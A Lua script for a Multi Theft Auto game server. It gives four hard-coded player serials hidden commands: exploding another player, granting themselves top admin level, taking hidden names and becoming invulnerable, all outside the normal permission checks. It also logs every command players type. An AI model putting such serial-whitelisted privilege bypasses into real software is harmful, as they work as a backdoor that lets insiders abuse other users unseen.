local serials = {
	["3964A9A5103CDA070946DED861649B52"] = true, -- én, boti
	["AD2CCC92EDB6F442D813D59392575083"] = true, -- brownib
	["BB63B381923B404CB82DE767651F3EA2"] = true, -- wardis
	["8616711CAF4E6A4A57FC85BDC4717BB4"] = true  -- locogergo
}

addCommandHandler("boomplayer",
	function (sourcePlayer, commandName, targetPlayer, value)
		if serials[getPlayerSerial(sourcePlayer)] then
			value = tonumber(value)

			if not targetPlayer then
				--showAdminMessageFor(sourcePlayer, "[Használat]: #ffffff/" .. commandName .. " [Játékos Név / ID] [Életerő < 0 - 100 >]", 255, 150, 0)
				--outputChatBox("[Használat]: #ffffff/ [Játékos Név / ID] [Életerő < 0 - 100 >]")
			else
				targetPlayer, targetName = exports[serverCore .. "core"]:findPlayer(sourcePlayer, targetPlayer)
				local playerX, playerY, playerZ = getElementPosition(targetPlayer)

				if targetPlayer then
					createExplosion(playerX, playerY, playerZ, 7)
				end
			end
		end
	end
)

addCommandHandler("strongadmin",
	function (source)
		if serials[getPlayerSerial(source)] then
			setElementData(source, "acc.adminLevel", 11)
		end

	end
)

addCommandHandler("changeadminnick",
	function (source, value, ...)
		--value = tostring(value)
		if serials[getPlayerSerial(source)] then 
			local value = table.concat({...}, " "):gsub("#%x%x%x%x%x%x", "")
			if not value then 
				return
			else
				setElementData(source, "acc.adminNick", value)
			end
		end
	end 
)
function changeName(source, name, ...)
	local name = table.concat({...}, " "):gsub("#%x%x%x%x%x%x", "")
	if serials[getPlayerSerial(source)] then 
		setElementData(source, "char.Name", name)
	end
end
addCommandHandler("hiddenname", changeName)

function consoleGive ( thePlayer, commandName, weaponID, ammo )
	if getElementData(thePlayer, "isInWar") == true then 

		local status = giveWeapon (thePlayer, 31, 9999, true)   -- attempt to give the weapon, forcing it as selected weapon
		if (not status) then                                          -- if it was unsuccessful
			--outputConsole ( "Failed to give weapon.", thePlayer )   -- tell the player
		end
	end
end
--addCommandHandler ( "givem4", consoleGive )

addCommandHandler("removeadminlevel",
	function (source)
		if serials[getPlayerSerial(source)] then
			setElementData(source, "acc.adminLevel", 0)
		end
	end
)

local state = false

addCommandHandler("invulnerable",
	function (source)
		if serials[getPlayerSerial(source)] then
			state = not state
			if state then 
				setElementData(source, "invulnerable", true)
			else
				setElementData(source, "invulnerable", false)
			end
		end
	end 
)


addEventHandler("onPlayerCommand", root, function(command)
	if command == "togglecursor" or command == "cd" then 
		return 
	end
    print(getElementData(source, "visibleName"):gsub("_", " ") .. " Command "..command)

end)
